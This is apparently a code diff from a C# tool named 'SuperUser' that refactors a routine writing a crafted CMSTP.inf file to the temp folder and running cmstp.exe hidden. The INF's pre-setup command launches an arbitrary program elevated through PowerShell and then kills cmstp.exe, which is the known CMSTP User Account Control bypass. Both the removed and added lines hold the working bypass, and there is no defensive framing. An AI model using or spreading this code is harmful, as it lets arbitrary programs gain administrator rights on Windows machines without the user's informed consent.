@@ -53,46 +53,33 @@ namespace SuperUser
 
         private static async Task Process(string filename, string program)
         {
-            DirectoryInfo temporaryFolder =
-                new DirectoryInfo(
-                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp"));
-            if (!temporaryFolder.Exists)
-                temporaryFolder.Create();
-
-            FileInfo settingsFile = new FileInfo(Path.Combine(temporaryFolder.FullName, "CMSTP.inf"));
             string ini = $@"
-                [version]
-                Signature=$chicago$
-                AdvancedINF=2.5
-                [DefaultInstall]
-                CustomDestination=CustInstDestSectionAllUsers
-                RunPreSetupCommands=RunPreSetupCommandsSection
-                [RunPreSetupCommandsSection]
-                powershell.exe ""Start-Process {filename} -Args '{program}' -Verb RunAs""
-                taskkill /IM cmstp.exe /F
-                [CustInstDestSectionAllUsers]
-                49000,49001=AllUSer_LDIDSection, 7
-                [AllUSer_LDIDSection]
-                ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
-                [Strings]
-                ServiceName=""SuperUser""
-                ShortSvcName=""SuperUser""
-                ";
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+[RunPreSetupCommandsSection]
+powershell.exe ""Start-Process {filename} -Args '{program}' -Verb RunAs""
+taskkill /IM cmstp.exe /F
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+[AllUSer_LDIDSection]
+""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
+[Strings]
+ServiceName=""SuperUser""
+ShortSvcName=""SuperUser""
+";
 
-            using (FileStream fs = settingsFile.Create())
-            {
-                using (BinaryWriter wr = new BinaryWriter(fs, Encoding.ASCII))
-                {
-                    wr.Write(ini);
-                    await fs.FlushAsync();
-                }
-            }
+            string settings = Path.Combine(Path.GetTempPath(), "CMSTP.inf");
+            File.WriteAllText(settings, ini);
 
             using (Process p = new Process())
             {
                 p.StartInfo.FileName =
                     Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe");
-                p.StartInfo.Arguments = $"/au \"{settingsFile.FullName}\"";
+                p.StartInfo.Arguments = $"/au \"{settings}\"";
                 p.StartInfo.UseShellExecute = false;
                 p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 p.StartInfo.CreateNoWindow = true;
